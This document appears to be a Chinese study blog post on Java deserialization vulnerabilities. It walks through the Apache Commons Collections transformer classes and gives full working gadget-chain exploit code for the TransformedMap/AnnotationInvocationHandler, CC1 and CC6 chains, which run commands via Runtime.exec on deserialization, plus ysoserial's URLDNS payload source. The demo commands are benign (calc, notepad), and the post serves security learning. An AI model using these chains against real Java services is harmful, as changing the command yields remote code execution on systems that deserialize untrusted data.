> java终于又开始了，我爱java
>
> 吹爆p牛的java安全漫谈-入门超友好
>
> 参考了: https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925

序列化和反序列化


RMI(`Java远程方法调用-Java Remote Method Invocation)`和`JMX(Java管理扩展-Java Management Extensions)`

具有广泛而深刻的利用。

## 0x01 序列化和反序列化

实现的方法很简单，只要实现了`java.io.Serializable(内部序列化)`或`java.io.Externalizable(外部序列化)` 这样的类就可以序列化和反序列化操作。

- 反序列化对象不走构造方法

  因为在源码中，`sun.reflect.ReflectionFactory.newConstructorForSerialization`构造了一个反序列化的专用构造方法。这一样也就可以绕过构造方法（unsafe也可以绕过

  原理的话:`根据cl参数(TestClass类的Class对象)和cons参数(基类Object的构造器)创建了一个新的构造器`

- 反射调用走构造方法

[不用构造方法实例化对象](https://www.iteye.com/topic/850027)

- Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题

:red_circle:这里说一下"**单例模式**"

在web开发应用中，有许多的对象只需要创建一次就可以了，而不是每次使用的时候都对他进行创建，这样比较浪费资源，所以比较好的处理方法就是将构造方法设置成`private`,然后设置一个静态属性来存储一个实例，这样就能拿到，而又不会被重新创建。

## 0x02 ObjectInputStream、ObjectOutputStream

```java
ObjectOutputStream out = new ObjectOutputStream(baos);
// 序列化DeserializationTest类
out.writeObject(t);
out.flush();
out.close();
```

核心逻辑其实就是使用`ObjectOutputStream`类的`writeObject`方法序列化`DeserializationTest`类，使用`ObjectInputStream`类的`readObject`方法反序列化`DeserializationTest`类而已。

注意这里序列化的时候，Java会通过反射所有不包含被`transient`修饰的变量和值)。

- 如果需要自定义序列化和反序列化
  1. **`private void writeObject(ObjectOutputStream oos)`,自定义序列化。**
  2. **`private void readObject(ObjectInputStream ois)`，自定义反序列化。**
  3. `private void readObjectNoData()`。
  4. `protected Object writeReplace()`，写入时替换对象。
  5. `protected Object readResolve()`。

可以通过实现以上接口来实现。

## 0x03 CC链

:a:几个知识点

- `CC` =>  `Apache Commons Collections`

- `TransformedMap`的构造

### Transformer接口

![image-20220105153214377](https://img.dem0dem0.top/images/image-20220105153214377.png)

```java
public interface Transformer {

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     * 将输入的obj(保持不变)转换为某个输出对象
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class 如果输入是错误
     * @throws IllegalArgumentException (runtime) if the input is invalid 如果输入无效
     * @throws FunctorException (runtime) if the transform cannot be completed 如果转换无法完成
     */
    public Object transform(Object input);

}
```

几个重要的实现类`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap`

- `ConstantTransformer`

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;

import org.apache.commons.collections.Transformer;

/**
 * Transformer implementation that returns the same constant each time.
 * 返回你输入的东西
 * <p>
 * No check is made that the object is immutable. In general, only immutable
 * objects should use the constant factory. Mutable objects should
 * use the prototype factory.
 * 
 * @since Commons Collections 3.0
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $
 *
 * @author Stephen Colebourne
 */
public class ConstantTransformer implements Transformer, Serializable {

    /** Serial version UID */
    private static final long serialVersionUID = 6374440726369055124L;
    
    /** Returns null each time */
    //总是返回null
    public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);

    /** The closures to call in turn */
    private final Object iConstant;

    /**
     * Transformer method that performs validation.
     *
     * @param constantToReturn  the constant object to return each time in the factory
     * @return the <code>constant</code> factory.
     */
    public static Transformer getInstance(Object constantToReturn) {
        if (constantToReturn == null) {
            return NULL_INSTANCE;
        }
        return new ConstantTransformer(constantToReturn);
    }
    
    /**
     * Constructor that performs no validation.
     * Use <code>getInstance</code> if you want that.
     * 
     * @param constantToReturn  the constant to return each time
     */
    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    /**
     * Transforms the input by ignoring it and returning the stored constant instead.
     * 
     * @param input  the input object which is ignored
     * @return the stored constant
     */
    public Object transform(Object input) {
        return iConstant;
    }

    /**
     * Gets the constant.
     * 
     * @return the constant
     * @since Commons Collections 3.1
     */
    public Object getConstant() {
        return iConstant;
    }
}
```

测试

```java
Object              obj         = Runtime.class;
ConstantTransformer transformer = new ConstantTransformer(obj);
System.out.println(transformer.transform(obj));
```

![image-20220105154327192](https://img.dem0dem0.top/images/image-20220105154327192.png)

- InvokerTransformer

源码

```java
  public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

可以看到利用反射的调用方法来invoke了，属于是。

```java
// 定义需要执行的本地系统命令
		String cmd = "calc";
		// 构建transformer对象
		InvokerTransformer transformer = new InvokerTransformer(
				"exec", new Class[]{String.class}, new Object[]{cmd}
		);
		// 传入Runtime实例，执行对象转换操作
		transformer.transform(Runtime.getRuntime());
```

那么这样这个就不要讲了。但是我们在实际利用中并不可以直接利用，得靠其他的类

-  ChainedTransformer

```java
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

这是对于传入的Transformer类进行链式调用，全都绑定一个object中，这个object又作为下一个transfer的参数。

```java
		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 执行对象转换操作
		Object transform = transformedChain.transform(null);

```

下面可以对这端代码进行改写。

```java
Method getRuntime = (Method) Runtime.class.getClass().getMethod("getMethod", new Class[]{String.class, Class[].class}).invoke(Runtime.class,new Object[]{"getRuntime", new Class[0]});
		Runtime runtime = (Runtime) getRuntime.getClass().getMethod("invoke", new Class[]{Object.class, Object[].class}).invoke(getRuntime, new Object[]{null, new Object[0]});
		runtime.getClass().getMethod("exec", new Class[]{String.class}).invoke(runtime, new Object[]{cmd});
```

这个链子还是算比较简单的一种

### 如何利用?

- 如何传入`ChainedTransformer`
- 如何调用它的`transform`

:a:

![image-20220105195529141](https://img.dem0dem0.top/images/image-20220105195529141.png)

这个类不仅实现了序列化接口，还支持对key和值进行`transform`处理。

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TransformedMapTest {

	public static void main(String[] args) {
		String cmd = "calc";

		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 创建Map对象
		Map map = new HashMap();
		map.put("value", "value");

		// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

//		 transformedMap.put("v1", "v2");// 执行put也会触发transform

		// 遍历Map元素，并调用setValue方法
		for (Object obj : transformedMap.entrySet()) {
			Map.Entry entry = (Map.Entry) obj;

			// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
			entry.setValue("test");
		}

		System.out.println(transformedMap);
	}

}

```

`setValue/put/putAll`这三个方法中都有对key和值进行transform的处理，不用多说了。

1. 实现了`java.io.Serializable`接口；
2. 并且可以传入我们构建的`TransformedMap`对象；
3. 调用了`TransformedMap`中的`setValue/put/putAll`中的任意方法一个方法的类；

### AnnotationInvocationHandler

`sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(`Java动态代理`)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中还间接的调用了`TransformedMap`中`MapEntry`的`setValue`方法，从而也就触发了`transform`方法，完成了整个攻击链的调用.

这一段话说的已经很明白了。

直接上攻击流程

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * Creator: yz
 * Date: 2019/12/16
 */
public class CommonsCollectionsTest {

    public static void main(String[] args) {
        String cmd = "open -a Calculator.app";

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        // 创建ChainedTransformer调用链对象
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 创建Map对象
        Map map = new HashMap();
        map.put("value", "value");

        // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
        Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
        try {
            // 获取AnnotationInvocationHandler类对象
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

            // 获取AnnotationInvocationHandler类的构造方法
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

            // 设置构造方法的访问权限
            constructor.setAccessible(true);

            // 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
            // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
            Object instance = constructor.newInstance(Target.class, transformedMap);

            // 创建用于存储payload的二进制输出流对象
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            // 创建Java对象序列化输出流对象
            ObjectOutputStream out = new ObjectOutputStream(baos);

            // 序列化AnnotationInvocationHandler类
            out.writeObject(instance);
            out.flush();
            out.close();

            // 获取序列化的二进制数组
            byte[] bytes = baos.toByteArray();

            // 输出序列化的二进制数组
            System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

            // 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
            ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

            // 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
            ObjectInputStream in = new ObjectInputStream(bais);

            // 模拟远程的反序列化过程
            in.readObject();

            // 关闭ObjectInputStream输入流
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

java1.8就把这个类修复了，无聊。。。。。

我们可以看一些yso的反序列化链子，把这个知识点进行串讲。

### CC1

jdk8u71以下。

```java
public class cc1 {
    public static void main(String[] args) throws Exception {
        //payload
        Transformer[] x = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"notepad"})
        };
        Transformer d = new ChainedTransformer(x);
        Map map = new HashMap();
        Map map1 = LazyMap.decorate(map, d);
        
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ct = cls.getDeclaredConstructor(Class.class, Map.class);
        ct.setAccessible(true);
        
        InvocationHandler handler = (InvocationHandler) ct.newInstance(Target.class, map1);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        Object o = ct.newInstance(Target.class, proxyMap);  //这样写也可handler = (InvocationHandler) ct.newInstance(Retention.class, proxyMap);

        //payload序列化写入文件，当作网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(o);  //如果用的后面那种，则把o换成handler

        //服务端反序列化payload读取
        FileInputStream f1 = new FileInputStream("payload.bin");
        ObjectInputStream f2 = new ObjectInputStream(f1);

        f2.readObject();

    }
}
```

这里的重点就在于那个`handle`r的它实现了`invoke`，可以来动态代理，就可以触发他的invoke方法，进而触发lazymap的get方法。不分析了，因为今天被版本恶心到了。

### CC6

解决了高版本危机。主要难点就在于如何找上下⽂中是否还有其他调⽤ `LazyMap#get()` 的地⽅

p牛找到的链子是`org.apache.commons.collections.keyvalue.TiedMapEntry`在它的`getValue`方法中调用了map的get方法。在他的`hashCode`方法中又调用了自己的`getValue`方法。所以现在要找一个调用`hashcode`方法的地方。

然后在`HashMap`的`hash(key)`，然后他的readobject方法中调用了该方法，所以现在让key等于`TiedMapEntry`就可以触发了。

链子初步构造

```java
        String cmd = "calc";
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };
        //构造利用链
        Map innermap = new HashMap();
        Transformer transformedChain = new ChainedTransformer(fakeTransformers);
        Map outermap = LazyMap.decorate(innermap,transformedChain);
        TiedMapEntry tme = new TiedMapEntry(outermap, "keykey");
        HashMap expMap = new HashMap();
        expMap.put(tme,"valuevalue");


        //避免一次触发
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformedChain, transformers);
        //模拟攻击

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        //生成序列化

        ByteArrayInputStream bai = new ByteArrayInputStream(barr.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bai);
        Object o = (Object)ois.readObject();
```

初步构造出来应该是这个样子的，但是我们执行发现并没有触发`？？`

p牛的调试发现`expMap.put(tme,"valuevalue");`问题其实在这里，hashmap的put方法其实已经执行了一次hash方法，但是因为我们前面是用的`fake`，所以在这里它就把`outermap`中增加了一个`keykey`的键，并且指向是1，后面调试的时候，也会发现，在hash的时候`key`它返回值的时候不是对象，而是keykey。

有什么办法处理呢？其实调用Out的remove删除keykey就可以了。

最后的大成功

```java

package com.anbai.sec.serializes;

import com.sun.xml.bind.v2.util.ByteArrayOutputStreamEx;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        //先构造出有利用的链
        String cmd = "calc";
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };
        //构造利用链
        Map innermap = new HashMap();
        Transformer transformedChain = new ChainedTransformer(fakeTransformers);
        Map outermap = LazyMap.decorate(innermap,transformedChain);
        TiedMapEntry tme = new TiedMapEntry(outermap, "keykey");
        HashMap expMap = new HashMap();
        expMap.put(tme,"valuevalue");

        outermap.remove("keykey");
        //避免一次触发
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformedChain, transformers);
        //模拟攻击

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        //生成序列化

        ByteArrayInputStream bai = new ByteArrayInputStream(barr.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bai);
        Object o = (Object)ois.readObject();
    }
}

```

### URLDNS

yso中的利用链

```java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}

```

